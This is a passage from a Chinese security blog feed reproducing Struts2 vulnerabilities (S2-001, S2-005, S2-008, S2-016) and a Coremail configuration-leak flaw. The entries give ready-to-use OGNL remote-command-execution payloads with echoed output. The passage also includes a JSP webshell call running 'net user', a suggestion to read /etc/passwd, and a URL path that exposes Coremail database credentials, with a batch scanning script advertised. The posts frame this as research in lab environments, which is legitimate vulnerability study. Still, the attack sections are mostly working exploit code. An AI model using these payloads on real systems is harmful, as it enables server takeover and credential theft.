title="第二步"></a>第二步</h2><p>搞出Burp进行改包，上POC<br><img src="https://img-blog.csdnimg.cn/20190703150242400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发包 回包<br><img src="https://img-blog.csdnimg.cn/20190703150842658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190703150714256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""><br>这算是写入了</p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>调用命令执行<br>访问 /test123456.jsp?pwd=asasd3344&amp;cmd=cmd%20+/c+net user<br><img src="https://img-blog.csdnimg.cn/20190703151141147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="附上POC-请勿用非法用途，只供研究和学习"><a href="#附上POC-请勿用非法用途，只供研究和学习" class="headerlink" title="附上POC 请勿用非法用途，只供研究和学习"></a>附上POC 请勿用非法用途，只供研究和学习</h2><p>链接：<a href="https://pan.baidu.com/s/11Yy49Fu5kc2uuisIzPbPLA" target="_blank" rel="noopener">https://pan.baidu.com/s/11Yy49Fu5kc2uuisIzPbPLA</a><br>提取码：0qk7<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-016漏洞环境和POC</title>
      <link href="/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"/>
      <url>/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="【研究】Struts2漏洞之S2-016漏洞环境和POC">TOC</a></p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p></blockquote><p>所以，访问<code>http://your-ip:8080/index.action?redirect:OGNL表达式</code>即可执行OGNL表达式。</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.0.0 - Struts 2.3.15</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br><img src="https://img-blog.csdnimg.cn/20190702160552445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>此漏洞用的是get传输即可实现，直接加就好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;%<span class="number">23</span>a%<span class="number">3</span>d(<span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> java.lang.String[]&#123;<span class="string">'cmd.exe'</span>, <span class="string">'/c'</span>,<span class="string">'whoami'</span>&#125;&#125;)).start(),%<span class="number">23</span>b%<span class="number">3</span>d%<span class="number">23</span>a.getInputStream(),%<span class="number">23</span>c%<span class="number">3</span>dnew java.io.InputStreamReader(%<span class="number">23</span>b),%<span class="number">23</span>d%<span class="number">3</span>dnew java.io.BufferedReader(%<span class="number">23</span>c),%<span class="number">23</span>e%<span class="number">3</span>dnew <span class="keyword">char</span>[<span class="number">50000</span>],%<span class="number">23</span>d.read(%<span class="number">23</span>e),%<span class="number">23</span>matt%<span class="number">3</span>d%<span class="number">23</span>context.get(<span class="string">'com.opensymphony.xwork2.dispatcher.HttpServletResponse'</span>),%<span class="number">23</span>matt.getWriter().println(%<span class="number">23</span>e),%<span class="number">23</span>matt.getWriter().flush(),%<span class="number">23</span>matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019070216140213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载文件，打开看命令<br><img src="https://img-blog.csdnimg.cn/20190702161305961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;struts2-showcase-2.1.6&#x2F;showcase.action?redirect:$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#39;cmd.exe&#39;, &#39;&#x2F;c&#39;,&#39;whoami&#39;&#125;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>下载打开文件<br><img src="https://img-blog.csdnimg.cn/20190702161717489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC注意"><a href="#POC注意" class="headerlink" title="POC注意"></a>POC注意</h2><p>这里发现POC是循环一样的数据 是这两句话 #d.read(#e),#matt.getWriter().println(#e)<br>多写几遍就是手动循环几遍</p><p>还有这句话 #e=new char[50000],#d.read(#e)<br>e的大小也关乎显示内容的长短，如果发现回显显示不全，可调整大一些</p>]]></content>
      
      
      <categories>
          
          <category> st2漏洞王 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC</title>
      <link href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/"/>
      <url>/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="【研究】Struts2漏洞之S2-008漏洞环境和可用POC">TOC</a></p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><pre><code>参考 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</code></pre><blockquote><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.1.0 - Struts 2.3.1</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br><img src="https://img-blog.csdnimg.cn/2019070117062659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%<span class="number">23</span>context%<span class="number">5</span>b%<span class="number">22</span>xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5</span>d%<span class="number">3</span>dfalse%<span class="number">2</span>c%<span class="number">23f</span>%<span class="number">3</span>d%<span class="number">23</span>_memberAccess.getClass%<span class="number">28</span>%<span class="number">29</span>.getDeclaredField%<span class="number">28</span>%<span class="number">22</span>allowStaticMethodAccess%<span class="number">22</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23f</span>.setAccessible%<span class="number">28</span><span class="keyword">true</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23f</span>.set%<span class="number">28</span>%<span class="number">23</span>_memberAccess%<span class="number">2</span>ctrue%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>a%<span class="number">3</span>d<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>%<span class="number">28</span>%<span class="number">29</span>.exec%<span class="number">28</span>%<span class="number">22</span>whoami%<span class="number">22</span>%<span class="number">29</span>.getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>b%<span class="number">3</span>dnew java.io.InputStreamReader%<span class="number">28</span>%<span class="number">23</span>a%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>c%<span class="number">3</span>dnew java.io.BufferedReader%<span class="number">28</span>%<span class="number">23</span>b%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>d%<span class="number">3</span>dnew <span class="keyword">char</span>%<span class="number">5</span>b50000%<span class="number">5</span>d%<span class="number">2</span>c%<span class="number">23</span>c.read%<span class="number">28</span>%<span class="number">23</span>d%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor%<span class="number">3</span>d%<span class="number">23</span>context.get%<span class="number">28</span>%<span class="number">22</span>com.opensymphony.xwork2.dispatcher.HttpServletResponse%<span class="number">22</span>%<span class="number">29</span>.getWriter%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.println%<span class="number">28</span>%<span class="number">23</span>d%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.flush%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.close%<span class="number">28</span>%<span class="number">29</span></span><br></pre></td></tr></table></figure><p><strong>这个POC是get模式传所以我们直接URL里面拼接就行</strong></p><p><img src="https://img-blog.csdnimg.cn/20190701164539250.png" alt="在这里插入图片描述"><br>一样弹出回显<img src="https://img-blog.csdnimg.cn/20190701164717926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="下载"><br><img src="https://img-blog.csdnimg.cn/20190701165118704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不知道什么编码，没东西好想</p><p>**</p><h2 id="有效POC’’"><a href="#有效POC’’" class="headerlink" title="有效POC’’"></a>有效POC’’</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.128:8080/struts2-showcase-2.1.6/showcase.action?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="ipconfig",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[501],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))</span></span><br></pre></td></tr></table></figure><p>这个是网上找的结合007构造的POC<br>可以直接回显<br><img src="https://img-blog.csdnimg.cn/20190701165826109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC注意"><a href="#POC注意" class="headerlink" title="POC注意"></a>POC注意</h2><p>这个poc也是得自己去调整，不是完全试用的<br>简单阅读和实验之后发现POC，发现res存在大小上限<br>测试发现，res更改的数值可以控制回显的字数多少</p><p>我这个大于700之后就是null了<br><img src="https://img-blog.csdnimg.cn/20190701170137420.png" alt="在这里插入图片描述"><br>但是从小的开始10慢慢增加会显示的数量<br><img src="https://img-blog.csdnimg.cn/20190701170343467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190701170403572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190701170433423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>500的时候差不多都显示了，所以这个得自己千调整试试</p><p>注意灵活控制res大小，注意不要将res大小超过命令执行结果</p>]]></content>
      
      
      <categories>
          
          <category> st2漏洞王 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-005漏洞环境和POC</title>
      <link href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-005%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"/>
      <url>/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-005%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="【研究】Struts2漏洞之S2-005漏洞环境和可用POC">TOC</a></p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>参考吴翰清的《白帽子讲Web安全》一书。</p></blockquote><blockquote><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p></blockquote><p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.address.city&#x3D;Bishkek&amp;user[&#39;favoriteDrink&#39;]&#x3D;kumys </span><br><span class="line">&#x2F;&#x2F;会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure><p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p><ul><li>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</li><li>S2-003 后官方增加了安全模式（沙盒）</li><li>S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</li></ul><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.1.0 - Struts 2.3.1</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开</p><p><img src="https://img-blog.csdnimg.cn/20190701141120939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;(<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(kxlzx)(kxlzx)&amp;(<span class="string">'\u0023_memberAccess.allowStaticMethodAccess\u003dtrue'</span>)(bla)(bla)&amp;(<span class="string">'\u0023mycmd\u003d\'ipconfig\''</span>)(bla)(bla)&amp;(<span class="string">'\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)'</span>)(bla)(bla)&amp;(A)((<span class="string">'\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())'</span>)(bla))&amp;(B)((<span class="string">'\u0023myres\u003dnew\40byte[51020]'</span>)(bla))&amp;(C)((<span class="string">'\u0023mydat.readFully(\u0023myres)'</span>)(bla))&amp;(D)((<span class="string">'\u0023mystr\u003dnew\40java.lang.String(\u0023myres)'</span>)(bla))&amp;(<span class="string">'\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()'</span>)(bla)(bla)&amp;(E)((<span class="string">'\u0023myout.getWriter().println(\u0023mystr)'</span>)(bla))</span><br></pre></td></tr></table></figure><p><strong>这个POC是get模式传所以我们直接URL里面拼接就行</strong><br><img src="https://img-blog.csdnimg.cn/20190701162044691.png" alt="在这里插入图片描述"></p><p>POC放到tomcat8.5 下会返回400，这个POC没回显。找了一下其他带回显poc没效果，之后再研究，有没有大佬指导一下是tomcat的版本原因吗</p><p>Apache Tomcat/7.0.56 这个版本是有回显的<br>会弹出一下下载<br><img src="https://img-blog.csdnimg.cn/20190701162055597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后打开看看<br><img src="https://img-blog.csdnimg.cn/20190701162131556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就是回显的命令</p>]]></content>
      
      
      <categories>
          
          <category> st2漏洞王 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】Struts2漏洞之S2-001漏洞环境和POC</title>
      <link href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-001%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"/>
      <url>/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-001%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="【研究】Struts2漏洞之S2-001漏洞环境和POC">TOC</a></p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}<br>进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value}<br>对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.0.0 - Struts 2.0.8</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br>![在这里插入图片描述]<br>[图片上传失败…(image-5bcfcf-1563099334703)]<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My1jZWI3ZjBiOTEzMGYyNGNlLnBuZw" alt="image"></p><p>这个漏洞的问题在于可以直接输入和直接回显<br>将POC粘到一个输入框，点击Submit<br>此后会将数据提交到后端，后端检测值是否为空，然后返回，满足漏洞前提</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>获取tomcat执行路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">"tomcatBinDir&#123;"</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty</span>(<span class="string">"user.dir"</span>)+<span class="string">"&#125;"</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0wOGRiYjU2OTg3NTk5N2ZkLnBuZw" alt="在这里插入图片描述"><br>获取Web路径：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0xN2EyMDBlODNlOWQzOWIx" alt="在这里插入图片描述"><br>执行任意命令（命令参数：<code>pwd</code>）：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"pwd"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0xOTJhZTdiZTM5NTQwODc1" alt="在这里插入图片描述"></p><p>命令要自己构造如</p><pre><code>{&quot;cat&quot;,&quot;/etc/passwd&quot;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 利用 st2漏洞王 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Coremail-0day敏感文件泄露漏洞送附批量检测脚本</title>
      <link href="/2019/06/17/Coremail-0day%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E9%80%81%E9%99%84%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/"/>
      <url>/2019/06/17/Coremail-0day%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E9%80%81%E9%99%84%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a><strong>漏洞介绍</strong></h2><p>Coremail邮件系统是业内唯一一款商用的超大规模运营级邮件系统，开始研发于1999年 [1]  ，其前身为中国第一套中文电子邮件系统163\126，目前在中国的客户包括网易系列邮箱、中国移动手机邮箱(139)等国内领先的邮箱服务运营商，以及宝钢、首钢、南方电网、农业银行、交通银行、华润、神华、华能等世界500强中国企业，截止2019年，Coremail邮件系统产品在国内已拥有10亿终端用户 [2]  ，已成为中国用户实际使用最广泛的电子邮件系统。</p><p>2019年5月22日，国家信息安全漏洞共享平台（CNVD）收录了由北京天融信网络安全技术有限公司报送的Coremail邮件系统信息泄露漏洞（CNVD-2019-16798）。<br>由于Coremail邮件系统的mailsms模块的参数大小写敏感存在缺陷，使得攻击者利用该漏洞，在未授权的情况下，通过远程访问URL地址获知Coremail服务器的系统配置文件，造成数据库连接参数等系统敏感配置信息泄露。</p><p>**<br>泄露页：<br><img src="https://img-blog.csdnimg.cn/20190617223418397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;mailsms&#x2F;s?func&#x3D;ADMIN:appState&amp;dumpConfig&#x3D;&#x2F;</span><br></pre></td></tr></table></figure><p>**<br>利用方式：</p><pre><code>域名/IP等地址+POC</code></pre><p>即可获取目标邮件服务器配置文件<br>配置文件包括：文件路径、IP、端口、数据库用户、密码等敏感信息。 </p><p>**<br><img src="https://img-blog.csdnimg.cn/2019061722321129.png" alt="在这里插入图片描述"><br>使用方法如下<br><img src="https://img-blog.csdnimg.cn/20190617223222864.png" alt="在这里插入图片描述"><br><strong>影响范围</strong><br>Coremail XT 3.0.1至XT 5.0.9版本，XT 5.0.9a及以上版本已修复该漏洞。</p><h2 id="批量测试脚本"><a href="#批量测试脚本" class="headerlink" 